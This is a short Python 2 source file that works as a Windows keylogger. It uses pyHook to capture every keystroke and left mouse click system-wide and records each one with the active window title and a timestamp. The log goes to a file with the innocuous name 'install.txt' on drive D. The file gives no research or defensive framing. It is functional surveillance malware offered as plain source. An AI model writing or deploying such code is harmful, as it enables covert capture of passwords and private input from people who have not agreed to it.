# -*- coding: utf-8 -*- #

__author__ = 'cyankw'

#version = 1.2

import pythoncom
import pyHook
import datetime
import os
oldwindowsName_keyboard = ''
oldwindowsName_Mouse = ''
oldwindowsName=''

def onMouseEvent(event):
    timeNow = datetime.datetime.now()
    Now = timeNow.strftime('%H:%M:%S')
    Mouse_input = open(r'd://install.txt', 'a')
    global oldwindowsName
    print "Click:", event.MessageName,event.Message
    print "Time:", datetime.datetime.now()
    if event.WindowName != oldwindowsName:
        Mouse_input.write( "---------\n")
        Mouse_input.write( "WindowName: %s %s\n" % (event.WindowName,event.Window))
        Mouse_input.write( "Time:%s\n" % datetime.datetime.now())
        oldwindowsName = event.WindowName

    Mouse_input.write( "        Click:%s%s%s\n" % (event.MessageName,event.Position,Now))

    return True


def onKeyboardEvent(event):
    # 监听键盘事件
    timeNow = datetime.datetime.now()
    Now = timeNow.strftime('%H:%M:%S')
    Keyboard_input = open(r'd://install.txt', 'a')
    global oldwindowsName
    if event.WindowName != oldwindowsName:
        Keyboard_input.write( "---------\n")
        Keyboard_input.write( "WindowName:%s\n" % event.WindowName)
        Keyboard_input.write( "Time:%s\n" % datetime.datetime.now())
        oldwindowsName = event.WindowName
    Keyboard_input.write( "     Key:%s        %s  \n" % (event.Key, Now))
    return True


def main():
    hm = pyHook.HookManager()

    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()


    hm.MouseLeftUp = onMouseEvent
    hm.HookMouse()

    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()


